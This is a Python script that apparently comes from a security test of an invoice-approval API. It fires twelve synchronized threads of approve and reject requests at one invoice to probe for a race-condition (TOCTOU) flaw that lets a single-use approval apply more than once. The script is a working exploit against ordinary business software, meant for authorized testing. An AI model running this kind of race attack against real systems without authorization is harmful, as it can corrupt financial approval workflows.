"""Race/TOCTOU on single-use approve. python -I race_approve.py <base> <ktv_tok> <ktt_tok> <invoice_id> <mode>
mode=approve (N concurrent approve L1) | mixed (approve vs reject concurrently)"""
import sys, json, time, threading, urllib.request, urllib.error
BASE, KTV, KTT, INV, MODE = sys.argv[1], open(sys.argv[2]).read().strip(), open(sys.argv[3]).read().strip(), sys.argv[4], sys.argv[5]
N = 12
def call(tok, method, path, body):
    h={"Authorization":"Bearer "+tok,"Content-Type":"application/json","Accept":"application/json"}
    r=urllib.request.Request(BASE+path, data=json.dumps(body).encode(), method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, resp.read().decode()[:200]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:200]
    except Exception as ex:
        return -1, str(ex)[:200]
barrier=threading.Barrier(N); results=[]; lock=threading.Lock()
def worker(i):
    barrier.wait()
    if MODE=="approve":
        s,b=call(KTV,"POST",f"/api/v1/invoices/{INV}/approve",{"level":1})
    else:
        if i%2==0: s,b=call(KTV,"POST",f"/api/v1/invoices/{INV}/approve",{"level":1})
        else:      s,b=call(KTV,"POST",f"/api/v1/invoices/{INV}/reject",{"reason":"SECTEST race reject"})
    with lock: results.append((i,s,b))
ts=[threading.Thread(target=worker,args=(i,)) for i in range(N)]
t0=time.perf_counter()
for t in ts: t.start()
for t in ts: t.join()
dt=time.perf_counter()-t0
print(f"# race mode={MODE} N={N} invoice={INV}  elapsed={dt*1000:.0f}ms  {time.strftime('%H:%M:%S %z')}")
from collections import Counter
c=Counter(s for _,s,_ in results)
print("status counts:", dict(c))
for i,s,b in sorted(results):
    print(f"  worker {i:>2}: {s}  {b[:120]}")
